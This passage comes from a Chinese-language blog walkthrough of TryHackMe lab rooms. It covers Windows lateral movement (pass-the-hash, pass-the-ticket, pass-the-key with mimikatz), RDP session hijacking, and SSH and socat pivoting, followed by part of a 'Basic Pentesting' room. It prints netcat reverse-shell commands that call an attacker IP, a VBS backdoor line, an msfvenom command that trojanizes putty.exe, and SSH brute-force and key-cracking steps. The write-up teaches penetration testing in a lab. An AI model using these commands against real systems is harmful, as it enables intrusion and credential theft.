-hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP 注意：仅 Linux 版本的 psexec 支持 PtH。 使用 PtH 连接到 WinRM： evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH Kerberos 身份验证 让我们快速了解一下 Kerberos 身份验证在 Windows 网络上的工作原理： 用户将其用户名和使用从其密码派生的密钥加密的时间戳发送到密钥分发中心 (KDC)，该服务通常安装在域控制器上，负责在网络上创建 Kerberos 票证。 KDC 将创建并发回票证授予票证 (TGT)，允许用户请求票证来访问特定服务，而无需将其凭据传递给服务本身。与 TGT 一起，还将向用户提供会话密钥，用户将需要该会话密钥来生成后续请求。 请注意，TGT 使用 krbtgt 帐户的密码哈希进行加密，因此用户无法访问其内容。重要的是要知道加密的 TGT 包括会话密钥的副本作为其内容的一部分，并且 KDC 不需要存储会话密钥，因为它可以在需要时通过解密 TGT 来恢复副本。 当用户想要连接到网络上的服务（例如共享、网站或数据库）时，他们将使用 TGT 向 KDC 请求票证授予服务 (TGS)。 TGS 是只允许连接到为其创建的特定服务的票证。要请求 TGS，用户将发送他的用户名和使用会话密钥加密的时间戳，以及 TGT 和服务主体名称 (SPN)，该名称指示我们打算访问的服务和服务器名称。 因此，KDC 将向我们发送 TGS 和服务会话密钥，我们需要对我们想要访问的服务进行身份验证。 TGS 使用服务所有者哈希进行加密。服务所有者是运行服务的用户或计算机帐户。 TGS 在其加密内容上包含服务会话密钥的副本，以便服务所有者可以通过解密 TGS 来访问它。 然后可以将 TGS 发送到所需的服务以进行身份验证并建立连接。该服务将使用其配置的帐户的密码哈希来解密 TGS 并验证服务会话密钥。 传票 有时可以使用 mimikatz 从 LSASS 内存中提取 Kerberos 票证和会话密钥。该过程通常需要我们在被攻击的机器上拥有 SYSTEM 权限，可以按如下方式完成： mimikatz # privilege::debug mimikatz # sekurlsa::tickets /export 请注意，如果我们只能访问票证而不能访问其相应的会话密钥，则我们将无法使用该票证；因此，两者都是必要的。 虽然 mimikatz 可以从 LSASS 进程的内存中提取任何可用的 TGT 或 TGS，但大多数时候，我们会对 TGT 感兴趣，因为它们可用于请求访问允许用户访问的任何服务。同时，TGS 仅适用于特定服务。提取 TGT 需要我们拥有管理员凭据，并且可以使用低权限帐户（仅分配给该帐户的帐户）来提取 TGS。 一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入当前会话： mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi 在我们自己的会话中注入票证不需要管理员权限。此后，我们用于横向移动的任何工具都可以使用门票。要检查票证是否已正确注入，您可以使用 klist 命令： za\\bob.jenkins@THMJMP2 C:\\&gt; klist Current LogonId is 0:0x1e43562 Cached Tickets: (1) #0&gt; Client: Administrator @ ZA.TRYHACKME.COM Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize Start Time: 4/12/2022 0:28:35 (local) End Time: 4/12/2022 10:28:35 (local) Renew Time: 4/23/2022 0:28:35 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0x1 -&gt; PRIMARY Kdc Called: THMDC.za.tryhackme.com 跨越哈希/传递密钥 这种攻击与 PtH 类似，但适用于 Kerberos 网络。 当用户请求 TGT 时，他们会发送使用从其密码派生的加密密钥加密的时间戳。用于派生此密钥的算法可以是 DES（在当前 Windows 版本上默认禁用）、RC4、AES128 或 AES256，具体取决于安装的 Windows 版本和 Kerberos 配置。如果我们拥有这些密钥中的任何一个，我们就可以向 KDC 请求 TGT，而无需实际密码，因此得名“传递密钥”(PtK)。 我们可以通过使用 mimikatz 和以下命令从内存中获取 Kerberos 加密密钥： mimikatz # privilege::debug mimikatz # sekurlsa::ekeys 根据可用的密钥，我们可以在 mimikatz 上运行以下命令，以通过密钥传递来获取反向 shell（为方便起见，THMJMP2 中已提供 nc64 ）： 如果我们有 RC4 哈希： mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:\"c:\\tools c64.exe -e cmd.exe ATTACKER_IP 5556\" 如果我们有 AES128 哈希： mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:\"c:\\tools c64.exe -e cmd.exe ATTACKER_IP 5556\" 如果我们有 AES256 哈希： mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:\"c:\\tools c64.exe -e cmd.exe ATTACKER_IP 5556\" 请注意，使用 RC4 时，密钥将等于用户的 NTLM 哈希值。这意味着，如果我们可以提取 NTLM 哈希，只要 RC4 是启用的协议之一，我们就可以使用它来请求 TGT。这种特殊的变体通常被称为 Overpass-the-Hash (OPtH)。 要接收反向 shell，我们应该在 AttackBox 上运行反向侦听器： user@AttackBox$ nc -lvp 5556 就像 PtH 一样，从此 shell 运行的任何命令都将使用通过 mimikatz 注入的凭据。 实践练习 要开始本练习，您需要使用以下凭据通过 SSH 连接到 THMJMP2： 用户：ZA.TRYHACKME.COM\\t2_felicia.dean Password：iLov3THM! ssh za\\\\t2_felicia.dean@thmjmp2.za.tryhackme.com 这些凭据将授予您对 THMJMP2 的管理访问权限，允许您使用 mimikatz 转储执行此任务期间提供的任何技术所需的身份验证材料。 使用 SSH 会话，使用 mimikatz 提取身份验证材料并针对域用户 t1_toby.beck 执行 Pass-the-Hash、Pass-the-Ticket 或 Pass-the-Key。 一旦您的命令提示符已加载其凭据，请使用 winrs 连接到 THMIIS 上的命令提示符。由于任何攻击都已将 t1_toby.beck 的凭据注入到您的会话中，因此您可以使用 winrs 而不指定任何凭据，并且它将使用当前会话可用的凭据： winrs.exe -r:THMIIS.za.tryhackme.com cmd 您会在 THMIIS 上 t1_toby.beck 的桌面上找到一个标志。 mimikatz 和 psexec64 均可在 THMJMP2 上的 C:\\tools 处获取。 Pass-the-Hash 首先就是获取计算机上用户的哈希值： privilege::debug token::elevate lsadump::sam或者sekurlsa::msv //我使用的后者 接着找到目标用户t1_toby.beck对应的hash值，如下图所示 然后，我们可以使用提取的哈希值来执行 PtH 攻击，方法是使用 mimikatz 在反向 shell（或您喜欢的任何其他命令）上为受害者用户注入访问令牌，如下所示： mimikatz # token::revert mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:\"c:\\tools c64.exe -e cmd.exe 10.50.46.236 5555\" 请注意，我们使用 token::revert 来重新建立原始令牌权限，因为尝试使用提升的令牌传递哈希将不起作用。 成功拿到shell，接着执行如下命令： 一旦您的命令提示符已加载其凭据，请使用 winrs 连接到 THMIIS 上的命令提示符。由于任何攻击都已将 t1_toby.beck 的凭据注入到您的会话中，因此您可以使用 winrs 而不指定任何凭据，并且它将使用当前会话可用的凭据： winrs.exe -r:THMIIS.za.tryhackme.com cmd 您会在 THMIIS 上 t1_toby.beck 的桌面上找到一个标志。 mimikatz 和 psexec64 均可在 THMJMP2 上的 C:\\tools 处获取。 Pass-the-Ticket 如果在目标机拥有管理员权限，则可以使用该方法： privilege::debug sekurlsa::tickets /export 请注意，如果我们只能访问票证而不能访问其相应的会话密钥，则我们将无法使用该票证；因此，两者都是必要的。 如上图，我们获取到了目标用户的TGT票证。 一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入当前会话： mimikatz # kerberos::ptt [0;cd6dd]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi 在我们自己的会话中注入票证不需要管理员权限。此后，我们用于横向移动的任何工具都可以使用门票。要检查票证是否已正确注入，您可以使用 klist 命令： 可以看到我们成功注入会话，成功进入目标用户的shell Pass-the-Key privilege::debug sekurlsa::ekeys 可以看到目标用户可以使用aes256算法以及rc4，这里就用aes256了 sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:\"c:\\tools c64.exe -e cmd.exe 10.50.46.236 5555\" 这里也是成功拿到shell，不过恰好靶机重置了，没截到图，这里就算了 0x06 滥用用户行为 在某些情况下，攻击者可以利用用户执行的操作来进一步访问网络中的计算机。虽然发生这种情况的方式有很多种，但我们将讨论一些最常见的方式。 滥用可写股份 在检查公司环境时，经常会发现合法用户用来执行日常任务的网络共享。如果这些共享由于某种原因是可写的，攻击者就可以植入特定文件来强制用户执行任意有效负载并获得对其计算机的访问权限。 一种常见的情况是查找网络共享上托管的脚本或可执行文件的快捷方式。 其背后的基本原理是，管理员可以在网络共享上维护可执行文件，并且用户可以执行它，而无需将应用程序复制或安装到每个用户的计算机上。如果我们作为攻击者拥有对此类脚本或可执行文件的写入权限，我们就可以对它们进行后门以强迫用户执行我们想要的任何有效负载。 尽管脚本或可执行文件托管在服务器上，但当用户在其工作站上打开快捷方式时，可执行文件将从服务器复制到其 %temp% 文件夹并在工作站上执行。因此，任何有效负载都将在最终用户工作站（和登录用户帐户）的上下文中运行。 后门 .vbs 脚本 例如，如果共享资源是VBS脚本，我们可以将nc64.exe的副本放在同一个共享上，并在共享脚本中注入以下代码： CreateObject(\"WScript.Shell\").Run \"cmd.exe /c copy /Y \\\\10.10.28.6\\myshare c64.exe %tmp% &amp; %tmp% c64.exe -e cmd.exe &lt;attacker_ip&gt; 1234\", 0, True 这会将 nc64.exe 从共享复制到用户工作站 %tmp% 目录，并在用户打开共享 VBS 脚本时向攻击者发送反向 shell。 .exe 文件后门 如果共享文件是 Windows 二进制文件，例如 putty.exe，您可以从共享下载它并使用 msfvenom 向其中注入后门。该二进制文件仍将照常工作，但会静默执行额外的有效负载。要创建后门 putty.exe，我们可以使用以下命令： msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b \"\\x00\" -f exe -o puttyX.exe 生成的 puttyX.exe 将在用户没有注意到的情况下执行reverse_tcp meterpreter有效负载。文件生成后，我们可以替换 Windows 共享上的可执行文件，并使用 Metasploit 中的exploit/multi/handler 模块等待任何连接。 RDP劫持 当管理员使用远程桌面连接到计算机并关闭 RDP 客户端而不是注销时，他的会话将无限期地在服务器上保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有系统权限，则无需密码即可接管任何现有 RDP 会话。 如果我们有管理员级别的访问权限，我们可以通过我们喜欢的任何方法获取 SYSTEM。现在，我们将使用 psexec 来执行此操作。首先，让我们以管理员身份运行 cmd.exe： 从那里运行 PsExec64.exe （可在 C:\\tools\\ 处获取）： PsExec64.exe -s cmd.exe 要列出服务器上现有的会话，可以使用以下命令： C:\\&gt; query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME &gt;administrator rdp-tcp#6 2 Active . 4/1/2022 4:09 AM luke 3 Disc . 4/6/2022 6:51 AM 根据上面的命令输出，如果我们当前使用管理员用户通过 RDP 连接，我们的 SESSIONNAME 将为 rdp-tcp#6 。我们还可以看到名为 luke 的用户打开了一个 ID 为 3 的会话。任何具有光盘状态的会话都已被用户保持打开状态，并且目前未被使用。虽然您也可以接管活动会话，但当您这样做时，合法用户将被迫退出其会话，他们可能会注意到这一点。 要连接到会话，我们将使用 tscon.exe 并指定我们将接管的会话 ID，以及当前的 SESSIONNAME。按照前面的示例，如果我们以管理员用户身份连接，要接管 luke 的会话，我们将使用以下命令： tscon 3 /dest:rdp-tcp#6 简单来说，该命令指出 luke 拥有的图形会话 3 应与管理员用户拥有的 RDP 会话 rdp-tcp#6 连接。 因此，我们将恢复 Luke 的 RDP 会话并立即连接到它。 注意：Windows Server 2019 不允许您在不知道密码的情况下连接到其他用户的会话。 实践练习 要完成此练习，您需要使用从 http://distributor.za.tryhackme.com/creds_t2 获取的一组新凭据连接到 THMJMP2（请注意，此链接与其他任务不同）。获得凭据后，通过 RDP 连接到 THMJMP2： xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384 这些凭据将授予您对 THMJMP2 的管理访问权限。 对于此任务，我们将劫持 RDP 会话。如果您有兴趣尝试在 exe 或其他文件中添加后门，您可以在 Windows 本地持久性室中找到一些与此相关的练习。 按照说明劫持 t1_toby.beck 在 THMJMP2 上的 RDP 会话以获取您的标志。 注意：执行 query session 时，您将看到几个名为 t1_toby.beck 的用户，后跟一个数字。这些只是同一用户的相同副本，您可以劫持其中任何一个（您不需要劫持全部）。确保劫持标记为已断开连接的会话（光盘）以避免干扰其他用户。 当我们以管理员打开cmd之后运行如下命令： PsExec64.exe -s cmd.exe 接着列出服务器上所有的会话： query user 要连接到会话，我们将使用 tscon.exe 并指定我们将接管的会话 ID，以及当前的 SESSIONNAME。按照前面的示例，如果我们以管理员用户身份连接，要接管 luke 的会话，我们将使用以下命令： tscon 4 /dest:rdp-tcp#27 简单来说，该命令指出 t1_toby.beck 拥有的图形会话 4 应与管理员用户拥有的 RDP 会话 rdp-tcp#27 连接。 如下图成功窃取到会话 0x07 端口转发 我们提出的大多数横向移动技术都需要特定端口可供攻击者使用。在现实网络中，管理员可能出于安全原因阻止了其中一些端口，或者在网络周围实施了分段，从而阻止您访问 SMB、RDP、WinRM 或 RPC 端口。 为了绕过这些限制，我们可以使用端口转发技术，其中包括使用任何受感染的主机作为跳转盒来转向其他主机。预计某些机器将比其他机器拥有更多的网络权限，因为企业中的每个角色在日常工作所需的网络服务方面都有不同的需求。 SSH 隧道 我们要研究的第一个协议是 SSH，因为它已经具有通过称为 SSH 隧道的功能进行端口转发的内置功能。虽然 SSH 曾经是与 Linux 系统相关的协议，但 Windows 现在默认附带 OpenSSH 客户端，因此您可以在当今的许多系统中找到它，而与操作系统无关。 SSH 隧道可以以不同的方式使用，通过 SSH 连接转发端口，我们将根据情况使用它。为了解释每种情况，我们假设一个场景，我们已经获得了对 PC-1 机器的控制权（不需要管理员访问权限），并且希望将其用作访问另一台机器上的端口的枢纽。我们无法直接连接。我们将启动一条从 PC-1 计算机（充当 SSH 客户端）到攻击者 PC（充当 SSH 服务器）的隧道。这样做的原因是，您经常会在 Windows 计算机上找到 SSH 客户端，但大多数时候没有可用的 SSH 服务器。 由于我们将连接回攻击者的计算机，因此我们希望在其中创建一个用户，而无需访问任何隧道控制台，并设置用于创建隧道的密码： useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser 根据您的需要，SSH 隧道可用于执行本地或远程端口转发。让我们看一下每个案例。 SSH 远程端口转发 在我们的示例中，假设防火墙策略阻止攻击者的计算机直接访问服务器上的端口 3389。如果攻击者之前已入侵 PC-1，并且 PC-1 可以访问服务器的端口 3389，则可以使用 PC-1 的远程端口转发将其转移到端口 3389。远程端口转发允许您从 SSH 客户端（在本例中为 PC-1）获取可访问的端口，并将其投射到远程 SSH 服务器（攻击者的计算机）中。 结果，攻击者的计算机上将打开一个端口，可用于通过 SSH 隧道连接回服务器中的端口 3389。反过来，PC-1 将代理连接，以便服务器将看到所有流量，就好像它来自 PC-1 一样： 此时可能会出现的一个有效问题是，如果我们已经破坏了 PC-1 并且可以直接从那里运行 RDP 会话，为什么我们需要端口转发。答案很简单：在我们只能通过控制台访问 PC-1 的情况下，我们将无法使用任何 RDP 客户端，因为我们没有 GUI。通过使攻击者的计算机可以使用该端口，您可以使用 Linux RDP 客户端进行连接。当您想要针对无法直接访问的端口运行漏洞利用时，会出现类似的情况，因为您的漏洞利用可能需要特定的脚本语言，而这种语言可能并不总是在您妥协的计算机上可用。 参考上图，要将服务器上的端口 3389 转发回攻击者的计算机，我们可以在 PC-1 上使用以下命令： C:\\&gt; ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user. 这将使用 tunneluser 用户建立从 PC-1 到 1.1.1.1 （攻击者 PC）的 SSH 会话。 由于 tunneluser 不允许在攻击者PC上运行shell，因此我们需要使用 -N 开关运行 ssh 命令以防止客户端请求一个，否则连接将立即退出。 -R 开关用于请求远程端口转发，语法要求我们首先指示将在 SSH 服务器上打开的端口 (3389)，后跟冒号，然后是 IP 和端口我们将转发的套接字的名称 (3.3.3.3:3389)。请注意，端口号不需要匹配，但在本示例中需要匹配。 命令本身不会输出任何内容，但隧道将取决于要运行的命令。无论何时，我们都可以像使用任何其他命令一样按 CTRL+C 来关闭隧道。 一旦我们的隧道设置并运行，我们就可以访问攻击者的计算机并通过 RDP 进入转发端口来到达服务器： munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword SSH 本地端口转发 本地端口转发允许我们将端口从 SSH 服务器“拉”到 SSH 客户端。在我们的场景中，这可用于获取攻击者计算机中可用的任何服务，并通过 PC-1 上的端口使其可用。这样，任何无法直接连接到攻击者 PC 但可以连接到 PC-1 的主机现在都可以通过枢轴主机访问攻击者的服务。 使用这种类型的端口转发将允许我们从通常无法连接回我们的主机上运行反向 shell，或者仅仅是使我们想要的任何服务对于没有直接连接到我们的机器的机器可用。 要从攻击者的计算机转发端口 80 并使其可从 PC-1 访问，我们可以在 PC-1 上运行以下命令： ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N 该命令结构与远程端口转发中使用的命令结构类似，但使用 -L 选项进行本地端口转发。此选项要求我们指示 PC-1 用于接收连接的本地套接字 ( *:80 ) 以及从攻击者的 PC 角度连接的远程套接字 ( 127.0.0.1:80 )。 请注意，我们在第二个套接字中使用 IP 地址 127.0.0.1，从攻击者的 PC 角度来看，这是持有要转发的端口 80 的主机。 由于我们在 PC-1 上打开一个新端口，因此我们可能需要添加防火墙规则以允许传入连接（使用 dir=in ）。为此需要管理权限： netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80 设置隧道后，任何将浏览器指向 http://2.2.2.2:80 的 PC-1 的用户都会看到攻击者计算机发布的网站。 使用 socat 进行端口转发 在 SSH 不可用的情况下，socat 可用于执行类似的功能。虽然不如 SSH 灵活，但 socat 允许您以更简单的方式转发端口。使用 socat 的缺点之一是我们需要将其传输到枢轴主机（在我们当前的示例中为 PC-1），使其比 SSH 更容易被检测到，但在没有其他选项可用的情况下可能值得一试。 使用 socat 执行端口转发的基本语法要简单得多。如果我们想打开主机上的端口 1234 并将我们收到的任何连接转发到主机 1.1.1.1 上的端口 4321，您将使用以下命令： socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321 fork 选项允许 socat 为收到的每个连接创建一个新进程，从而可以在不关闭的情况下处理多个连接。如果不包含它，socat 将在第一个连接完成时关闭。 回到我们的示例，如果我们想像使用 SSH 远程端口转发一样使用 PC-1 作为枢纽来访问服务器上的端口 3389，我们可以使用以下命令： C:\\&gt;socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 请注意，socat 无法像 SSH 那样将连接直接转发到攻击者的计算机，但会在 PC-1 上打开一个端口，攻击者的计算机随后可以连接到该端口： 像往常一样，由于在枢轴主机上打开了一个端口，我们可能需要创建一个防火墙规则以允许到该端口的任何连接： netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 另一方面，如果我们想从攻击者的机器公开端口 80，以便服务器可以访问它，我们只需要稍微调整一下命令： C:\\&gt;socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 结果，PC-1 将生成端口 80 并侦听要转发到攻击者计算机上的端口 80 的连接： 动态端口转发和 SOCKS 虽然单端口转发对于需要访问特定套接字的任务非常有效，但有时我们可能需要通过枢轴主机对主机的许多端口甚至跨多台计算机的许多端口运行扫描。在这些情况下，动态端口转发允许我们通过主机进行旋转，并使用 SOCKS 代理与我们想要的任何 IP 地址/端口建立多个连接。 由于我们不想依赖目标网络中 Windows 计算机上现有的 SSH 服务器，因此我们通常会使用 SSH 客户端通过以下命令建立反向动态端口转发： C:\\&gt; ssh tunneluser@1.1.1.1 -R 9050 -N 在这种情况下，SSH 服务器将在端口 9050 上启动 SOCKS 代理，并通过 SSH 隧道转发任何连接请求，最终由 SSH 客户端代理。 最有趣的部分是，我们可以使用代理链通过 SOCKS 代理轻松使用我们的任何工具。为此，我们首先需要确保 proxychains 正确配置为将任何连接指向 SOCKS 代理服务器的 SSH 使用的同一端口。 proxychains 配置文件可以在 AttackBox 上的 /etc/proxychains.conf 处找到。如果我们向下滚动到配置文件的末尾，我们应该看到一行指示用于袜子代理的端口： [ProxyList] socks4 127.0.0.1 9050 默认端口是 9050，但是只要与我们建立 SSH 隧道时使用的端口匹配，任何端口都可以工作。 如果我们现在想通过代理执行任何命令，我们可以使用代理链： proxychains curl http://pxeboot.za.tryhackme.com 请注意，某些软件（例如 nmap）在某些情况下可能无法与 SOCKS 很好地配合，并且可能显示不同的结果，因此您的情况可能会有所不同。 实践练习 注意：由于您将使用 tunneluser 执行从实验室网络到攻击者计算机的 SSH 连接，因此我们强烈建议您使用 Attackbox 或虚拟机，而不是您的实际计算机。已给出有关创建不允许通过 SSH/SCP 运行命令或传输文件的用户的说明，因此请务必按照提供的说明进行操作。还建议为 tunneluser 创建一个强密码，并确保它是唯一且可丢弃的密码，而不是您在此或任何其他平台中的实际密码。 要完成此练习，您需要使用在任务 1 中从 http://distributor.za.tryhackme.com/creds 分配给您的凭据连接到 THMJMP2。如果您还没有这样做，请单击链接并立即获取凭据。获得凭据后，通过 SSH 连接到 THMJMP2： ssh za\\\\tony.holland@thmjmp2.za.tryhackme.com //密码为：Mhvn2334 我们的第一个目标是通过 RDP 连接到 THMIIS。如果我们尝试直接从攻击者计算机进行连接，我们会发现端口 3389 已通过防火墙过滤，因此无法直接使用。但是，该端口已启动并正在运行，但只能从 THMJMP2 访问。通过使用 THMJMP2 上 C:\\tools\\socat\\ 上提供的 socat，我们将转发 RDP 端口，使其在 THMJMP2 上可用于从攻击者的计算机进行连接。 为此，我们将使用以下参数运行 socat： C:\\tools\\socat\\&gt;socat TCP4-LISTEN:3697,fork TCP4:THMIIS.za.tryhackme.com:3389 请注意，我们不能将端口 3389 用于侦听器，因为它已在 THMJMP2 中用于其自己的 RDP 服务。请随意将侦听器端口 (13389) 更改为其他号码，以避免与其他学生发生冲突。在典型设置中，您必须添加防火墙规则以允许流量通过侦听器端口，但为了方便起见，THMJMP2 已禁用其防火墙。 设置侦听器后，您应该能够通过 THMJMP2 处的 socat 侦听器通过 RDP 从攻击者计算机连接到 THMIIS： user@AttackBox$ xfreerdp /v:THMJMP2.za.tryhackme.com:3697 /u:t1_thomas.moore /p:MyPazzw3rd2020 连接后，您应该会从 THMIIS 上的 t1_thomas.moore 桌面上获得一个标志。 隧道复杂漏洞 THMDC 服务器正在运行 Rejetto HFS 的易受攻击版本。我们面临的问题是防火墙规则限制对易受攻击的端口的访问，因此只能从 THMJMP2 进行查看。此外，来自 THMDC 的出站连接仅允许其本地网络中的计算机进行，因此无法直接接收到攻击者计算机的反向 shell。更糟糕的是，Rejetto HFS 漏洞要求攻击者托管 HTTP 服务器来触发最终有效负载，但由于攻击者的计算机不允许出站连接，因此我们需要找到一种方法来托管 Web 服务器之一同一网络中的其他机器，这一点也不方便。我们可以使用端口转发来克服所有这些问题。 首先，让我们看看该漏洞利用程序是如何工作的。首先，它将连接到 HFS 端口（Metasploit 中的 RPORT ）以触发第二个连接。第二个连接将在 SRVPORT 上针对攻击者的计算机进行，其中 Web 服务器将传递最终的有效负载。最后，攻击者的有效负载将在 LPORT 上执行并向攻击者发送回反向 shell： 考虑到这一点，我们可以使用 SSH 将某些端口从攻击者的计算机转发到 THMJMP2（用于 Web 服务器的 SRVPORT 和用于接收反向 shell 的 LPORT），并通过 THMJMP2 到达 THMDC 上的 RPORT。我们需要在两个方向上进行三个端口转发，以便所有漏洞利用的交互都可以通过 THMJMP2 进行代理： Rejetto HFS 将侦听 THMDC 上的端口 80，因此我们需要使用远程端口转发通过 THMJMP2 将该端口隧道传回攻击者的计算机。由于攻击盒的 80 端口已被其他服务占用，因此我们需要将 THMDC 上的端口 80 与攻击盒当前未使用的某个端口链接起来。让我们使用端口 8888。在 THMJMP2 中运行 ssh 来转发此端口时，我们必须将 -R 8888:thmdc.za.tryhackme.com:80 添加到我们的命令中。 对于SRVPORT和LPORT，我们随意选择两个随机端口。出于演示目的，我们将设置 SRVPORT=6666 和 LPORT=7878 ，但请务必使用不同的端口，因为实验室与其他学生共享，因此如果你们两个选择相同的端口，当尝试转发它们时，您会收到一条错误消息，指出此类端口已在 THMJMP2 上使用。 要将此类端口从攻击者计算机转发到 THMJMP2，我们将通过在 ssh 命令中添加 -L *:6666:127.0.0.1:6666 和 -L *:7878:127.0.0.1:7878 来使用本地端口转发。这将绑定 THMJMP2 上的两个端口，并将任何连接隧道返回到我们的攻击者计算机。 将整个命令放在一起，我们最终会得到以下结果： C:\\&gt; ssh tunneluser@10.50.46.236 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N 注意：如果您使用 AttackBox 并且之前加入过其他网络房间，请务必选择分配给面向 lateralmovementandpivoting 网络的隧道接口的 IP 地址作为您的 ATTACKER_IP，否则您的反向 shell/连接将获胜无法正常工作。为了您的方便，连接到该网络的接口称为 lateralmovement ，因此您应该能够通过运行 ip add show lateralmovement 获得正确的 IP 地址： 一旦所有端口转发到位，我们就可以启动 Metasploit 并配置漏洞利用程序，以便所需的端口与我们通过 THMJMP2 转发的端口相匹配： 这里有很多东西需要解压： LHOST参数通常有两个用途：作为攻击者机器上绑定监听器的IP，用于接收反向shell；它还嵌入在有效负载中，以便受害者知道在触发漏洞时从哪里进行连接。在我们的特定场景中，由于 THMDC 无法联系到我们，因此我们需要强制有效负载连接回 THMJMP2，但我们需要侦听器在 127.0.0.1 上绑定到攻击者的计算机。为此，Metasploit 提供了一个可选参数 ReverseListenerBindAddress ，该参数可用于指定攻击者机器上侦听器的绑定地址，与负载将连接回的地址分开。在我们的示例中，我们希望将反向 shell 侦听器绑定到攻击者计算机上的 127.0.0.1，并将有效负载连接回 THMJMP2（因为它将通过 SSH 隧道转发到攻击者计算机）。 我们的漏洞还必须运行一个 Web 服务器来托管并将最终有效负载发送回受害者服务器。我们使用 SRVHOST 来指示监听地址，在本例中为 127.0.0.1，以便攻击者机器将 Web 服务器绑定到 localhost。虽然这可能违反直觉，因为没有外部主机能够指向攻击者的计算机本地主机，但 SSH 隧道将负责将 SRVPORT 处 THMJMP2 上收到的任何连接转发回攻击者的计算机。 RHOSTS 设置为指向 127.0.0.1，因为 SSH 隧道将通过使用 THMJMP2 建立的 SSH 隧道将请求转发到 THMDC。 RPORT 设置为 8888，因为发送到攻击者计算机上该端口的任何连接都将转发到 THMDC 上的端口 80。 启动该漏洞后，您将在攻击者的计算机上收到一个 shell。您会在 C:\\hfs\\flag.txt 上找到一个标志。 0x08 参考文章 TryHackMe | Lateral Movement &amp; Pivoting","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Basic Pentesting","path":"/2024/02/14/thm-basic-pentesting/","content":"0x01 简介 在这组任务中，您将学到以下内容： brute forcing 暴力破解 hash cracking 哈希破解 service enumeration 服务枚举 Linux Enumeration Linux枚举 这里的主要目标是尽可能多地学习。确保您使用 OpenVPN 配置文件连接到我们的网络。 感谢来自 Vulnhub 的 Josiah Pierce。 0x02 nmap扫描 nmap -Pn -A -v ip 0x03 目录扫描 dirsearch -u \"url\" 访问该目录会发现两个txt文件 dev.txt: 2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K 2018-04-22: SMB has been configured. -K 2018-04-21: I got Apache set up. Will put in our content later. -J 主要是说这里设置了SMB服务与Apache服务什么的. J.txt For J: I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP. -K 主要是说/etc/shadow中的密码薄弱，存在被爆破的风险，到这里我就没什么思路了。不知道从哪里入手去破解密码 0x04 SMB服务-暴力破解 enum4linux ip 漫长的十分钟，最终我们看到上图显示了jan与kay用户名，接下来尝试ssh密码的爆破 0x05 SSH密码爆破 按理来说这里应该是要对两个用户名都进行爆破的，但wp似乎都是马后炮，只选择jan，这也意味着kay爆破不出来。 hydra -l jan -P /usr/share/wordlists/passwords/rockyou.txt 10.10.134.126 ssh 成功拿到密码，接下来进行ssh连接。 0x06 SSH密钥密码爆破 在上面成功连接之后发现不是root权限，我们先用自动化脚本来对机器进行一波信息搜集 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 之后在攻击机开启http服务，在靶机上通过wget或curl下载脚本文件 curl [vpnhostIP]/linpeas.sh | sh 扫描之后如下图，发现存在ssh密钥，攻击是要通过这个来进行ssh的连接，对应的用户名为kay 进入ssh目录后我们发现存在id_rsa等文件，这里我们本可以直接尝试利用ssh私钥进行登录，但是如下图，还是需要密码，那接下来就只能进行密钥密码的爆破了 但幸运的是我们可以找到这个文件并用 JohnTheRipper 破解密钥 使用 ssh2john.py id_rsa &gt; john_id_rsa.hash 我们得到一个 john-crackable 文件，我们可以从这里开始。 john --wordlist=/usr/share/wordlists/passwords/rockyou.txt john_id_rsa.hash 成功拿到密码，接着进行ssh登录即可 0x07 Linux提权 –方法二 回顾之前的Linux提权方法，我们做一些尝试 这里发现suid中含有vim，这意味着我们可以 以 root身份进行任意文件的读写，既然可以读写，意味着我们有两个思路： 一个是向/etc/passwd文件创建root用户，另一个是收集passwd与shadow文件，之后进行密码的爆破 